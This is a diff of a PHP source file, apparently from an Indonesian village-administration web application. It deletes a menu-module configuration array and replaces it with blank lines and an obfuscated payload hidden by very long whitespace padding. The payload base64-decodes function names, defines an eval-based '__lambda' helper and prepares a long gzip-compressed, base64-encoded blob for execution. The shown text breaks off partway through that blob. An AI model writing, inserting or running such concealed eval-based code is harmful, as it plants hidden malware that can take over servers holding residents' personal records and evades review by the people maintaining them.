-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-bookmark',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Administrasi Penduduk',
-                'slug'       => 'administrasi-penduduk',
-                'url'        => 'bumindes_penduduk_induk/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-users',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-users',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Administrasi Pembangunan',
-                'slug'       => 'administrasi-pembangunan',
-                'url'        => 'bumindes_rencana_pembangunan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-university',
-                'urut'       => 4,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-university',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Eskpedisi',
-                'slug'       => 'buku-eskpedisi',
-                'url'        => 'ekspedisi/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 10,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Lembaran Dan Berita [Desa]',
-                'slug'       => 'buku-lembaran-dan-berita-desa',
-                'url'        => 'lembaran_desa/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 11,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Layanan Pelanggan',
-                'slug'       => 'layanan-pelanggan',
-                'url'        => 'pelanggan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-credit-card',
-                'urut'       => 5,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-credit-card',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Pengaturan',
-                'slug'       => 'pengaturan-layanan-mandiri',
-                'url'        => 'setting/mandiri',
-                'aktif'      => 1,
-                'ikon'       => 'fa-gear',
-                'urut'       => 6,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-gear',
-                'parent'     => 14,
-            ],
-            [
-                'modul'      => 'Buku Mutasi Penduduk',
-                'slug'       => 'buku-mutasi-penduduk',
-                'url'        => 'bumindes_penduduk_mutasi/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 15,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Rekapitulasi Jumlah Penduduk',
-                'slug'       => 'buku-rekapitulasi-jumlah-penduduk',
-                'url'        => 'bumindes_penduduk_rekapitulasi/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 16,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Penduduk Sementara',
-                'slug'       => 'buku-penduduk-sementara',
-                'url'        => 'bumindes_penduduk_sementara/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 17,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku KTP dan KK',
-                'slug'       => 'buku-ktp-dan-kk',
-                'url'        => 'bumindes_penduduk_ktpkk/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 18,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Tanah Kas [Desa]',
-                'slug'       => 'buku-tanah-kas-desa',
-                'url'        => 'bumindes_tanah_kas_desa/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 12,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Tanah di [Desa]',
-                'slug'       => 'buku-tanah-di-desa',
-                'url'        => 'bumindes_tanah_desa/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 13,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Pendapat',
-                'slug'       => 'pendapat',
-                'url'        => 'pendapat',
-                'aktif'      => 1,
-                'ikon'       => 'fa-thumbs-o-up',
-                'urut'       => 5,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-thumbs-o-up',
-                'parent'     => 14,
-            ],
-            [
-                'modul'      => 'Buku Inventaris dan Kekayaan [Desa]',
-                'slug'       => 'buku-inventaris-dan-kekayaan-desa',
-                'url'        => 'bumindes_inventaris_kekayaan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 14,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Rencana Kerja Pembangunan',
-                'slug'       => 'buku-rencana-kerja-pembangunan',
-                'url'        => 'bumindes_rencana_pembangunan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 19,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Lapak',
-                'slug'       => 'lapak',
-                'url'        => 'lapak_admin',
-                'aktif'      => 1,
-                'ikon'       => 'fa-cart-plus',
-                'urut'       => 122,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-cart-plus',
-                'parent'     => 0,
-            ],
-            [
-                'modul'      => 'Laporan APBDes',
-                'slug'       => 'laporan-apbdes',
-                'url'        => 'laporan_apbdes',
-                'aktif'      => 1,
-                'ikon'       => 'fa-file-text-o',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-file-text-o',
-                'parent'     => 201,
-            ],
-            [
-                'modul'      => 'Sinkronisasi',
-                'slug'       => 'sinkronisasi',
-                'url'        => 'sinkronisasi',
-                'aktif'      => 1,
-                'ikon'       => ' fa-random',
-                'urut'       => 125,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-random',
-                'parent'     => 343,
-            ],
-            [
-                'modul'      => 'Lembaga [Desa]',
-                'slug'       => 'lembaga-desa',
-                'url'        => 'lembaga/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-list',
-                'urut'       => 4,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-list',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Kategori Lembaga',
-                'slug'       => 'kategori-lembaga',
-                'url'        => 'lembaga_master',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 6,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Bumindes Kegiatan Pembangunan',
-                'slug'       => 'bumindes-kegiatan-pembangunan',
-                'url'        => 'bumindes_kegiatan_pembangunan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => null,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Laporan penduduk',
-                'slug'       => 'laporan-penduduk',
-                'url'        => 'laporan_penduduk',
-                'aktif'      => 1,
-                'ikon'       => 'fa-file-text-o',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 1,
-                'ikon_kecil' => 'fa-file-text-o',
-                'parent'     => 3,
-            ],
-            [
-                'modul'      => 'Pendaftaran Kerjasama',
-                'slug'       => 'pendaftaran-kerjasama',
-                'url'        => 'pendaftaran_kerjasama',
-                'aktif'      => 1,
-                'ikon'       => 'fa-list',
-                'urut'       => 6,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-list',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Kader Pemberdayaan Masyarakat',
-                'slug'       => 'bumindes-kader',
-                'url'        => 'bumindes_kader',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => null,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Buku Inventaris Hasil - Hasil Pembangunan',
-                'slug'       => 'bumindes-hasil-pembangunan',
-                'url'        => 'bumindes_hasil_pembangunan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => null,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Pengaduan',
-                'slug'       => 'pengaduan',
-                'url'        => 'pengaduan_admin',
-                'aktif'      => 1,
-                'ikon'       => 'fa-info',
-                'urut'       => 124,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-info',
-                'parent'     => 0,
-            ],
-            [
-                'modul'      => 'Vaksin',
-                'slug'       => 'vaksin',
-                'url'        => 'vaksin_covid/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa fa-medkit',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 206,
-            ],
-            [
-                'modul'      => 'Arsip [Desa]',
-                'slug'       => 'arsip-desa',
-                'url'        => 'bumindes_arsip',
-                'aktif'      => 1,
-                'ikon'       => 'fa-archive',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-archive',
-                'parent'     => 301,
-            ],
-            [
-                'modul'      => 'Jam Kerja',
-                'slug'       => 'jam-kerja',
-                'url'        => 'kehadiran_jam_kerja',
-                'aktif'      => 1,
-                'ikon'       => 'fa-clock-o',
-                'urut'       => 2,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-credit-card',
-                'parent'     => 337,
-            ],
-            [
-                'modul'      => 'Hari Libur',
-                'slug'       => 'hari-libur',
-                'url'        => 'kehadiran_hari_libur',
-                'aktif'      => 1,
-                'ikon'       => 'fa-calendar',
-                'urut'       => 2,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-credit-card',
-                'parent'     => 337,
-            ],
-            [
-                'modul'      => 'Rekapitulasi',
-                'slug'       => 'rekapitulasi',
-                'url'        => 'kehadiran_rekapitulasi',
-                'aktif'      => 1,
-                'ikon'       => 'fa-list',
-                'urut'       => 2,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-list',
-                'parent'     => 337,
-            ],
-            [
-                'modul'      => 'Pengaduan',
-                'slug'       => 'kehadiran-pengaduan',
-                'url'        => 'kehadiran_pengaduan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-exclamation',
-                'urut'       => 2,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-exclamation',
-                'parent'     => 337,
-            ],
-            [
-                'modul'      => 'Pesan',
-                'slug'       => 'pesan',
-                'url'        => 'opendk_pesan/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-envelope',
-                'urut'       => 124,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-envelope',
-                'parent'     => 343,
-            ],
-            [
-                'modul'      => 'Grup Kontak',
-                'slug'       => 'grup-kontak',
-                'url'        => 'grup_kontak',
-                'aktif'      => 1,
-                'ikon'       => 'fa fa-list',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => 'fa fa-list',
-                'parent'     => 10,
-            ],
-            [
-                'modul'      => 'Stunting',
-                'slug'       => 'stunting',
-                'url'        => 'stunting',
-                'aktif'      => 1,
-                'ikon'       => 'fa-stethoscope',
-                'urut'       => 4,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-stethoscope',
-                'parent'     => 206,
-            ],
-            [
-                'modul'      => 'Daftar Anjungan',
-                'slug'       => 'daftar-anjungan',
-                'url'        => 'anjungan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-list',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-list',
-                'parent'     => 312,
-            ],
-            [
-                'modul'      => 'Menu',
-                'slug'       => 'anjungan-menu',
-                'url'        => 'anjungan_menu',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bars',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-bars',
-                'parent'     => 312,
-            ],
-            [
-                'modul'      => 'Pengaturan',
-                'slug'       => 'pengaturan-anjungan',
-                'url'        => 'anjungan_pengaturan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-gear',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-gear',
-                'parent'     => 312,
-            ],
-            [
-                'modul'      => 'Alasan Keluar',
-                'slug'       => 'alasan-keluar',
-                'url'        => 'kehadiran_keluar',
-                'aktif'      => 1,
-                'ikon'       => 'fa-sign-out',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-sign-out',
-                'parent'     => 337,
-            ],
-            [
-                'modul'      => 'Gawai Layanan',
-                'slug'       => 'gawai-layanan',
-                'url'        => 'gawai_layanan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-desktop',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-desktop',
-                'parent'     => 14,
-            ],
-            [
-                'modul'      => 'DTKS',
-                'slug'       => 'dtks',
-                'url'        => 'dtks',
-                'aktif'      => 1,
-                'ikon'       => 'fa-exchange',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-exchange',
-                'parent'     => 352,
-            ],
-            [
-                'modul'      => 'Data Tamu',
-                'slug'       => 'data-tamu',
-                'url'        => 'buku_tamu',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bookmark-o',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-bookmark-o',
-                'parent'     => 354,
-            ],
-            [
-                'modul'      => 'Data Kepuasan',
-                'slug'       => 'data-kepuasan',
-                'url'        => 'buku_kepuasan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-smile-o',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-smile-o',
-                'parent'     => 354,
-            ],
-            [
-                'modul'      => 'Data Pertanyaan',
-                'slug'       => 'data-pertanyaan',
-                'url'        => 'buku_pertanyaan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-question',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-question',
-                'parent'     => 354,
-            ],
-            [
-                'modul'      => 'Data Keperluan',
-                'slug'       => 'data-keperluan',
-                'url'        => 'buku_keperluan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-send',
-                'urut'       => 4,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-send',
-                'parent'     => 354,
-            ],
-            [
-                'modul'      => 'Optimasi Gambar',
-                'slug'       => 'optimasi-gambar',
-                'url'        => 'optimasi_gambar',
-                'aktif'      => 1,
-                'ikon'       => 'fa-picture-o',
-                'urut'       => 7,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-picture-o',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Program Bantuan',
-                'slug'       => 'program-bantuan',
-                'url'        => 'program_bantuan/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-heart',
-                'urut'       => 101,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => 'fa-heart',
-                'parent'     => 6,
-            ],
-            [
-                'modul'      => 'Peserta Bantuan',
-                'slug'       => 'peserta-bantuan',
-                'url'        => 'peserta_bantuan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-picture-o',
-                'urut'       => 102,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => 'fa-picture-o',
-                'parent'     => 6,
-            ],
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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